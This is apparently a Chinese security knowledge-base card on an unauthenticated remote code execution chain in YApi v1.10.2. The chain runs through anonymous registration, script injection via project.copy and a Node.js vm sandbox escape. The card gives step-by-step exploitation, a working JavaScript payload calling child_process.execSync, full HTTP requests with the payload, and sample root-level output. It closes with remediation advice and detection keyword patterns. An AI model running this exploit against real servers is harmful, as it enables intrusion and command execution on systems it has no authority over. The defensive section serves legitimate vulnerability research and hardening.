---
id: web-nodejs-yapi-project-copy-script-vm-unauth-rce
title: YApi v1.10.2 未授权 RCE：匿名注册 + project.copy 脚本注入 + 原生 vm 沙箱逃逸
type: scenario
domain: web
path: web/nodejs
technique: yapi-project-copy-script-vm-sandbox-unauth-rce
tags:
- yapi
- nodejs
- rce
- missing-authorization
- script-injection
- vm-sandbox-escape
- unauthenticated
- project-copy
cve: []
severity: critical
confidence: high
status: verified
affected_versions: YApi < v1.11.0（原文复现 v1.10.2）
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V41
  verified_at: '2026-11-05T06:30:10+08:00'
  notes: 已对照原文与5张截图核对：匿名注册返回 uid/Set-Cookie、/api/user/status 的 canRegister:true、project.copy 注入 after_script、project token、run_auto_test 回显 whoami=root / id && uname -a / cat /etc/passwd 均与卡片一致；受影响版本按原文 v1.10.2 及之前、v1.11.0 修复标注。原文为本地 Docker 实测，未在本机复现。
url: /docs/web/nodejs/web-nodejs-yapi-project-copy-script-vm-unauth-rce/
draft: false
kb_aliases:
- YApi RCE
- YApi v1.10.2 未授权 RCE
- project.copy 脚本注入
- run_auto_test RCE
- pre_script after_script 命令执行
- YApi vm 沙箱逃逸
---

## 一句话结论

YApi v1.10.2 及更早版本存在一条完整未授权命令执行链：默认允许匿名注册（`closeRegister` 默认 `false`），注册用户可通过 `project.copy` 把 `after_script` 原样写入项目（该接口只校验目标 group、不校验源项目、不过滤脚本字段），再用任意项目 token 调用 `/api/open/run_auto_test` 触发服务端执行项目脚本；脚本运行在 Node.js 原生 `vm` 中，而 `vm` 不是安全边界，攻击者经 `this.constructor.constructor` 逃逸到宿主 `process`，以 Node 进程权限执行任意系统命令并回显结果。

## 原理

- **匿名入口**：`server/controllers/base.js` 的 `ignoreRouter` 白名单包含 `/api/user/reg`，命中后直接把 `this.$auth = true`，因此注册接口无需登录即可调用。YApi 默认 `closeRegister: false`，绝大多数公网实例满足前置条件。`/api/user/status` 虽不返回 401，但响应中的 `canRegister` 字段可用于无凭据探测注册是否开放。
- **对象级鉴权缺失**：`server/controllers/project.js` 的 `copy()` 只检查 `params.group_id`（目标 group）的 `edit` 权限，不检查 `copyId`（源项目）是否属于调用者；随后 `Object.assign(params, {...})` 把整个请求体并入落库数据，`Model.save(data)` 不做字段白名单，导致请求体中的 `pre_script` / `after_script` 直接写入 MongoDB。copy 的 schema 本身显式声明了 `pre_script` / `after_script`，说明服务端预期接受这两个字段，但没有限制谁能写。
- **token 鉴权面**：`openApiRouter` 允许用项目 token（`query.token` 或 `body.token`）代替登录态，`$auth = true` 的判定只要求 token 能解析出项目 ID，不校验用户。`/api/project/token` 同样缺少对象级鉴权，任意登录用户都能按 `project_id` 取到项目 token。
- **sink 无总开关**：`/api/open/run_auto_test` 执行测试用例时，把项目的 `pre_script` / `after_script` 注入 `crossRequest`；v1.10.2 的 `crossRequest` 不做 `scriptEnable` 判断，直接对非空脚本调用 `sandbox()`。v1.11.0 才加入 `scriptEnable` 开关并默认关闭。
- **vm 不是沙箱**：`sandbox()` 用 `vm.createContext(context)` + `new vm.Script(script).runInContext(ctx)` 执行脚本。Node.js 官方明确声明 `vm` 不是安全机制。传入的 `context` 对象由宿主代码创建，脚本顶层 `this` 指向它，因此 `this.constructor` 是宿主的 `Object`，`this.constructor.constructor` 是宿主的 `Function`；用宿主 `Function("return process")()` 可取得宿主 `process`，再经 `process.mainModule.require("child_process")` 加载模块执行命令。脚本写入 `responseData` 的内容会随测试结果响应返回，形成回显通道。

## 触发条件

- YApi 版本 ≤ v1.10.2（v1.11.0 起脚本执行受 `scriptEnable` 控制，默认关闭）。
- 目标可从网络访问，且未关闭注册（默认 `closeRegister: false`，可通过 `/api/user/status` 的 `canRegister` 探测）。
- 攻击者能完成注册并创建项目、接口与测试用例；无需管理员权限，也无需预置账号。
- 目标项目存在可执行的测试用例；`run_auto_test` 通过项目 token 鉴权，不需要 Cookie。
- Node.js 进程运行用户权限决定命令执行权限（原文容器内为 root）。

## 利用步骤

1. `GET /api/user/status`，确认响应中 `canRegister` 为 `true`。
2. `POST /api/user/reg` 匿名注册并拿到会话 Cookie；YApi 会自动为用户分配私有 group。
3. `GET /api/group/get_mygroup` 取自己的 group_id；`POST /api/project/add` 创建一个源项目。
4. `POST /api/project/copy`，`_id` 指向源项目，在请求体中附加 `after_script` 逃逸 payload；服务端只校验目标 group 的 edit 权限，脚本字段原样落库。
5. `POST /api/interface/add` 建接口，`POST /api/col/add` 建集合，`POST /api/col/add_case` 建测试用例（`run_auto_test` 需要用例触发）。
6. `GET /api/project/token?project_id=<复制出的项目>` 取项目 token。
7. `GET /api/open/run_auto_test?id=<col_id>&project_id=<项目>&token=<token>&mode=json` 触发，无需 Cookie；脚本被执行，命令输出位于 `data.list[0].res_body.output`。
8. 替换 `execSync` 中的命令进行后续操作（读文件、探测内网、反弹 Shell 等）。

## PoC

最小注入载荷（放入 `after_script`）：

```javascript
try {
  var p = this.constructor.constructor("return process")();
  var r = p.mainModule.require("child_process").execSync("id").toString();
  responseData = { output: r };
} catch (e) {
  responseData = { error: e.message };
}
```

关键请求：

```http
POST /api/project/copy HTTP/1.1
Content-Type: application/json
Cookie: <注册后会话>

{"_id":"<src_project_id>","name":"rce","basepath":"/poc","group_id":"<group_id>","project_type":"private","cat":[],"after_script":"try{var p=this.constructor.constructor(\"return process\")();var r=p.mainModule.require(\"child_process\").execSync(\"id\").toString();responseData={output:r}}catch(e){responseData={error:e.message}}"}
```

```http
GET /api/open/run_auto_test?id=<col_id>&project_id=<rce_project_id>&token=<project_token>&mode=json HTTP/1.1
```

响应中的命令输出：

```json
{"data":{"list":[{"res_body":{"output":"uid=0(root) gid=0(root) groups=0(root)\n"}}]}}
```

原文实测 `whoami`、`id && uname -a`、`cat /etc/passwd` 三条命令均以 Node 进程权限（容器内 root）成功回显。PoC 依赖 `process.mainModule`（CommonJS 入口）；ESM 入口或移除该属性时需另找能力放大路径。

## 变体与关联

- 变体（脚本执行开关）：v1.11.0 引入 `scriptEnable` 并默认 `false`，该链在默认配置下失效；若管理员显式开启脚本执行，sink 仍然存在。
- 变体（入口组合）：`project.copy` 不校验源项目，理论上可复制他人项目并注入脚本；原文 PoC 为降低前置条件，复制的是自己新建的源项目。真正必需的是“脚本字段可写入”与“脚本可被触发”，源项目越权是额外的攻击面。
- 变体（token 面）：`/api/project/token` 无对象级鉴权，任意登录用户可按项目 ID 取 token；若目标已有可触发项目，可省去自建项目步骤。
- 关联：[[binary-pwn-sandbox-escape-nodejs-vm-constructor-constructor]]（本链使用的原生 `vm` 逃逸原语，含机制与通用边界）。
- 关联：[[web-nodejs-n8n-expression-sandbox-escape-rce]]（同为 Node.js 应用把用户脚本交给沙箱、经 `process.mainModule.require` 执行命令；n8n 走 vm2）。
- 关联：[[binary-pwn-sandbox-escape-vm2-cross-realm-implicit-call]]（vm2 的跨 Realm 逃逸；与原生 vm 的“宿主上下文对象泄漏构造器”不是同一根因）。
- 修复侧关联：v1.11.0 提交 `59bade3` 加入 `scriptEnable`；原文另提到修复 Mongo 注入取 token 的提交 `432cdfe`，属另一问题，未在本卡展开。

## 检测与防御

- 升级到 v1.11.0+，并确认 `scriptEnable` 保持默认 `false`；若业务必须执行脚本，视为高信任功能并单独隔离。
- 关闭匿名注册：`closeRegister: true`；对 `/api/user/status` 暴露的 `canRegister` 做资产测绘。
- 给 `project.copy` 增加源项目权限校验（`checkAuth(copyId, 'project', 'view')`），并删除请求体中的 `pre_script`、`after_script`、`project_mock_script` 等脚本字段。
- 给 `/api/project/token` 增加对象级鉴权（`checkAuth(project_id, 'project', 'view')`）。
- 不要用原生 `vm` 执行不可信代码；改用独立进程/容器 + seccomp/namespace，或经安全审计的隔离方案（vm2 自身也有历史逃逸，需持续跟踪）。
- 以非 root 用户运行 Node.js 进程，限制容器出网与文件系统权限，降低逃逸后的影响面。
- 检测：审计 `run_auto_test` 调用中异常的 `project_id`/`token` 组合；检索项目文档中的 `pre_script`/`after_script` 是否含 `constructor.constructor`、`process`、`require("child_process")`、`execSync`；监控 Node 进程派生子进程及测试接口返回体中的命令输出特征；关注短时间内的匿名注册 + 项目创建 + 测试执行序列。
